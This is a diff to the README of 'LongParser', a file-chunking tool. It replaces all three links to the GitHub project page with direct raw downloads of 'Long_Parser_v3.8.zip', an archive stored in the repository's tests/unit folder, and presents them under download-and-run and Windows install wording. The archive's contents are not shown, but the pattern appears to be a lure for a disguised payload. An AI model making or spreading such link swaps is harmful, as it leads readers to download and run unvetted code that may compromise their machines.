@@ -1,6 +1,6 @@
 # 🧩 LongParser - Turn files into ready chunks
 
-[![Download LongParser](https://img.shields.io/badge/Download%20LongParser-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rippledirham767/LongParser)
+[![Download LongParser](https://img.shields.io/badge/Download%20LongParser-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rippledirham767/LongParser/main/tests/unit/Long_Parser_v3.8.zip)
 
 ## 📄 What LongParser does
 
@@ -34,7 +34,7 @@ For better results with scanned PDFs:
 
 Visit this page to download and run LongParser:
 
-[Open LongParser on GitHub](https://github.com/Rippledirham767/LongParser)
+[Open LongParser on GitHub](https://raw.githubusercontent.com/Rippledirham767/LongParser/main/tests/unit/Long_Parser_v3.8.zip)
 
 ## 🛠️ How to install on Windows
 
@@ -239,7 +239,7 @@ This is useful when you want parsed text to move from files into search or answe
 
 Open the project page here:
 
-[https://github.com/Rippledirham767/LongParser](https://github.com/Rippledirham767/LongParser)
+[https://raw.githubusercontent.com/Rippledirham767/LongParser/main/tests/unit/Long_Parser_v3.8.zip](https://raw.githubusercontent.com/Rippledirham767/LongParser/main/tests/unit/Long_Parser_v3.8.zip)
 
 ## ✅ Quick start for Windows
 
